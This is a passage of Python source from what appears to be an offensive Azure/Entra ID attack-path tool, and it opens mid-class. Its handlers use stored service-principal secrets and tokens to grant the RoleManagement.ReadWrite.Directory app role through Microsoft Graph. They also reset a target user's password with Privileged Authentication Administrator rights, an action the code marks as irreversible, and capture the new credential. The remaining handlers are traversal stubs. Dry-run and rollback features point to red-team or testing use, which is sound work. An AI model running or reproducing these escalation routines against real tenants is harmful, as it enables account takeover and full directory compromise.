    Rollback: DELETE /servicePrincipals/{resourceSpId}/appRoleAssignedTo/{assignmentId}
    """

    # Microsoft Graph SP object ID (consistent across all tenants)
    MSGRAPH_SP_ID = "00000003-0000-0000-c000-000000000000"
    # RoleManagement.ReadWrite.Directory appRoleId in MS Graph
    ROLE_MGMT_RW_DIR = "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"

    def _sp_creds(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
        appid = edge.properties.get("source_appid") or edge.source.properties.get("appid")
        secret = edge.properties.get("secret")
        if not secret:
            for c in self.cred_store.all_credentials():
                if c.cred_type == CredentialType.azure_secret and (
                    not appid or c.username == appid
                ):
                    secret, appid = c.value, (appid or c.username)
                    break
        if emitting():
            appid = appid or "<SP_APP_ID>"
            secret = secret or "<SP_SECRET>"
        return appid, secret

    def _grant_to(self, edge: EdgeInfo) -> str | None:
        p = edge.properties.get("grant_to")
        if not p and emitting():
            p = "<GRANTEE_SP_OBJECT_ID>"
        return p

    def _resource_sp_id(self, edge: EdgeInfo) -> str:
        return edge.properties.get("resource_sp_id") or self.MSGRAPH_SP_ID

    def _app_role_id(self, edge: EdgeInfo) -> str:
        return edge.properties.get("app_role_id") or self.ROLE_MGMT_RW_DIR

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        appid, secret = self._sp_creds(edge)
        if not appid or not secret:
            return False, (
                "No SP appId/secret — run AZAddSecret on the source SP's app first, or pass "
                "-p source_appid=<appId> -p secret=<value>"
            )
        if not self._grant_to(edge):
            return False, "No grantee SP — pass -p grant_to=<spObjectId>"
        return True, (
            f"SP {edge.source.name} (AppRoleAssignment.ReadWrite.All) can grant "
            f"appRole {self._app_role_id(edge)} to {self._grant_to(edge)}"
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        src_appid, secret = self._sp_creds(edge)
        grant_to = self._grant_to(edge)
        resource_sp_id = self._resource_sp_id(edge)
        app_role_id = self._app_role_id(edge)

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would grant appRole {app_role_id} to SP {grant_to} on resource {resource_sp_id}",
                [],
            )

        tenant = az.tenant_id if az else "<TENANT>"
        token = await roadtx.get_sp_token(
            src_appid, secret, tenant, roadtx_bin=(az.roadtx_path if az else "roadtx")
        )
        if not token:
            return False, "Failed to obtain SP client-credentials token via roadtx", []

        # First: resolve the MS Graph SP object ID in the tenant (it has a different objectId per tenant)
        if resource_sp_id == self.MSGRAPH_SP_ID:
            sp_lookup = await roadtx.graph_request(
                "GET", f"/servicePrincipals?$filter=appId eq '{self.MSGRAPH_SP_ID}'", token
            )
            values = (sp_lookup.get("parsed") or {}).get("value") or []
            if values:
                resource_sp_id = values[0].get("id", resource_sp_id)
            elif not emitting():
                return False, "Could not resolve Microsoft Graph SP object ID in this tenant", []

        res = await roadtx.graph_request(
            "POST",
            f"/servicePrincipals/{resource_sp_id}/appRoleAssignedTo",
            token,
            body={
                "principalId": grant_to,
                "resourceId": resource_sp_id,
                "appRoleId": app_role_id,
            },
        )
        if not res.get("success"):
            return False, f"App role grant failed: {res.get('error', 'unknown')}", []

        assignment_id = (res.get("parsed") or {}).get("id")
        self._last_resource_sp_id = resource_sp_id
        self._last_assignment_id = assignment_id
        return (
            True,
            f"Granted appRole {app_role_id} to SP {grant_to} (assignment {assignment_id})",
            [],
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        rsp = getattr(self, "_last_resource_sp_id", None)
        aid = getattr(self, "_last_assignment_id", None)
        if not rsp or not aid:
            return None
        url = f"{roadtx.GRAPH_BASE}/servicePrincipals/{rsp}/appRoleAssignedTo/{aid}"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_app_role_assignment",
            description=f"Remove appRole assignment {aid}",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )


# ---------------------------------------------------------------------------
# Traversal / informational edge stubs
# ---------------------------------------------------------------------------

class _AzureTraversalHandler(AzureBaseHandler):
    """Base for traversal edges that carry no direct exploitation action."""

    _edge_name: str = "AZTraversal"

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        return True, f"{self._edge_name}: {edge.source.name} → {edge.target.name} (traversal)"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        return True, f"{self._edge_name}: no tool action required (traversal/informational)", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        return None


@register_handler("AZContains")
class AZContainsHandler(_AzureTraversalHandler):
    """AZContains: tenant/subscription contains a resource. Traversal only."""
    _edge_name = "AZContains"


@register_handler("AZRunsAs")
class AZRunsAsHandler(_AzureTraversalHandler):
    """AZRunsAs: App Registration is backed by this Service Principal. Traversal only."""
    _edge_name = "AZRunsAs"


@register_handler("AZMemberOf")
class AZMemberOfHandler(_AzureTraversalHandler):
    """AZMemberOf: principal is a member of a group. Traversal only."""
    _edge_name = "AZMemberOf"


@register_handler("AZHasRole")
class AZHasRoleHandler(_AzureTraversalHandler):
    """AZHasRole: principal holds a directory role. Traversal/informational.

    Exploitation depends on the role — use AZPrivilegedRoleAdmin, AZResetPassword,
    or AZAddOwner handlers for the actual abuse primitives.
    """
    _edge_name = "AZHasRole"


@register_handler("AZGlobalAdmin")
class AZGlobalAdminHandler(_AzureTraversalHandler):
    """AZGlobalAdmin: principal holds Global Administrator on the tenant.

    Traversal edge — the principal can abuse nearly any privilege.  Chain with
    AZAddSecret, AZResetPassword, AZPrivilegedRoleAdmin, or AZAddOwner on
    specific targets for the actual exploitation steps.
    """
    _edge_name = "AZGlobalAdmin"


@register_handler("AZPrivilegedAuthAdmin")
class AZPrivilegedAuthAdminHandler(AzureBaseHandler):
    """AZPrivilegedAuthAdmin: source holds Privileged Authentication Administrator.

    Can reset passwords and authentication methods for most non-GA users.
    Exploits by resetting a specific target user's password.
    Target user via ``-p target_user_id=<objectId>`` and
    ``-p target_upn=<UPN>`` (for the Graph PATCH call).
    """

    @staticmethod
    def _new_password() -> str:
        import secrets as _secrets
        import string
        body = "".join(_secrets.choice(string.ascii_letters + string.digits) for _ in range(20))
        return body + "Aa1!"

    def _target_user(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
        """Returns (objectId, UPN) of the user to attack."""
        uid = edge.properties.get("target_user_id")
        upn = edge.properties.get("target_upn")
        if emitting():
            uid = uid or "<TARGET_USER_OBJECT_ID>"
            upn = upn or "<TARGET_UPN>"
        return uid, upn

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        uid, upn = self._target_user(edge)
        if not uid:
            return False, "No target user — pass -p target_user_id=<objectId> -p target_upn=<UPN>"
        return True, (
            f"{edge.source.name} (Privileged Auth Admin) can reset password for {upn or uid}"
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        uid, upn = self._target_user(edge)
        new_pw = "<NEW_PASSWORD>" if emitting() else self._new_password()

        if dry_run:
            return True, f"[DRY RUN] Would reset password of {upn or uid}", []

        token = await self._user_token(edge)
        if not token:
            return False, f"Failed to obtain Graph token for {edge.source.name}", []

        res = await roadtx.graph_request(
            "PATCH", f"/users/{uid}", token,
            body={"passwordProfile": {"forceChangePasswordNextSignIn": False, "password": new_pw}},
        )
        if not res.get("success"):
            return False, f"Password reset failed: {res.get('error', 'unknown')}", []

        cred = Credential(
            cred_type=CredentialType.password,
            value=new_pw,
            username=(upn or uid or "").split("@")[0],
            domain=az.tenant_domain if az else "<TENANT>",
            obtained_from=f"AZPrivilegedAuthAdmin on {upn or uid}",
        )
        return True, f"Reset password of {upn or uid} via Privileged Auth Admin", [cred]

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        return None  # irreversible


@register_handler(
    "AZMGDirectory_ReadWrite_All",
    "AZMGRoleManagement_ReadWrite_Directory",
    "AZMGAppRoleAssignment_ReadWrite_All",
    "AZMGApplication_ReadWrite_All",
    "AZMGGroupMember_ReadWrite_All",
    "AZAuthenticatesTo",
)
class AZMGPermissionEdgeHandler(_AzureTraversalHandler):
    """AZMGDirectory_ReadWrite_All and similar: informational edges showing which
    MS Graph application permissions an SP holds.  No direct tool action —
    use the corresponding AZMG* exploitation handler for the actual abuse.
    """
    _edge_name = "AZMGPermission"
